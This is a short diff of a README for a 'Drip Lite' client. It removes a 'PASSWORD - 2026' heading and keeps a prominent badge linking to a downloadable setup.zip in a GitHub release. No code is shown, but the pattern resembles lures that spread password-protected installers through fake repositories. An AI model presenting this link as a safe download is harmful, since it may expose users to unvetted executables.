@@ -13,7 +13,7 @@ Drip Lite &amp; update + fix
 
 ---
 
-## 📥 PASSWORD - 2026
+## 
 
 [![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/DoctorWhisper/Drip-Lite-Client/releases/download/swe/setup.zip)
 ---
